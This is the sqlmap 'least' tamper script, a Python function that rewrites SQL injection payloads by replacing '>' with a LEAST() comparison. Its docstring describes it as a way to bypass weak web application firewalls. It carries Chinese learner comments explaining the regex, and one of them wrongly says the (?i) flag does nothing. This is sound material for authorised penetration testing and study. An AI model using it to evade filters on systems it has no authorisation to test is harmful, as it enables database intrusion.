#!/usr/bin/env python

"""
Copyright (c) 2006-2021 sqlmap developers (https://sqlmap.org/)
See the file 'LICENSE' for copying permission
"""

import re

from lib.core.enums import PRIORITY

__priority__ = PRIORITY.HIGHEST

def dependencies():
    pass

def tamper(payload, **kwargs):
    """
    Replaces greater than operator ('>') with 'LEAST' counterpart

    Tested against:
        * MySQL 4, 5.0 and 5.5
        * Oracle 10g
        * PostgreSQL 8.3, 8.4, 9.0

    Notes:
        * Useful to bypass weak and bespoke web application firewalls that
          filter the greater than character
        * The LEAST clause is a widespread SQL command. Hence, this
          tamper script should work against majority of databases

    >>> tamper('1 AND A > B')
    '1 AND LEAST(A,B+1)=B+1'
    """

    retVal = payload

    if payload:
        match = re.search(r"(?i)(\b(AND|OR)\b\s+)([^>]+?)\s*>\s*(\w+|'[^']+')", payload)
        ##前面忘记介绍了
        #这个(?i)是不起作用的
        #(\b(AND|OR)\b\s+)匹配AND或者OR  
        #([^>]+?)匹配出A
        #\s*>\s*匹配出>
        #(\w+|'[^']+')在剩下中匹配出B
        #所有匹配都是一环套一环的  前面没有限定的话，后面匹配无法成功
        if match:
            _ = "%sLEAST(%s,%s+1)=%s+1" % (match.group(1), match.group(3), match.group(4), match.group(4))
            #上面正则全部匹配之后，系统后台自动弄为gourp整型，然后分别用match.group（3）、match.group（4）进行代入
            retVal = retVal.replace(match.group(0), _)
    
    return retVal
